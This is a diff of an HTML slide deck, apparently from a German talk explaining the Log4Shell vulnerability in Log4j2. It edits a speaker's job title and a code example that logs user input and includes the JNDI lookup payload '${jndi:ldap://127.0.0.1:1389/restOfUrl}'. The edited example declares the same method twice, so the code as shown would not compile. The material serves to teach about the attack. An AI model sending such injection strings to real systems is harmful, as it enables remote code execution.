@@ -87,7 +87,7 @@
             <div class="content">
                 <h1>Referenten</h1>
                 <h2>Christoph Wende</h2>
-                <p>Expert Backend Developer & Team Lead</p>
+                <p>Expert Software Architect & Team Lead</p>
                 <div class="block"></div>
                 <ul class="lower">
                     <li>Agile Development Evangelist</li>
@@ -129,19 +129,22 @@
                 <h1>Wie lief der Exploit?</h1>
                 <p>Über Platzhalter können in Log4j2 dynamisch Informationen in Log-Nachrichten eingefügt werden. Diese Informationen konnten in der Standardkonfiguration auch über
                     JNDI geladen werden.</p>
-                <pre><code data-line-numbers="6" data-trim class="java">
+                <pre><code data-line-numbers="|6|10" data-trim class="java">
 public class VulnerableLoggingClass {
 
     private static final Logger logger = LogManager.getLogger(VulnerableLoggingClass.class);
 
-    public static void main(String[] args) {
-        logger.error("Malicious string in log message: ${jndi:ldap://127.0.0.1:1389/restOfUrl}");
+    public void logAnError(String[] args) {
+        logger.error("Unable to authenticate user " + args[0]);
     }
-
+    
+    public void logAnError(String[] args) {
+        logger.error("Unable to authenticate user ${jndi:ldap://127.0.0.1:1389/restOfUrl}");
+    }
 }
                 </code></pre>
                 <div class="fragment">
-                    <img src="images/recap.png" alt="Ablaufdiagramm des Angriffs">
+                    <img src="images/recap2.png" alt="Ablaufdiagramm des Angriffs">
                 </div>
             </div>
         </section>
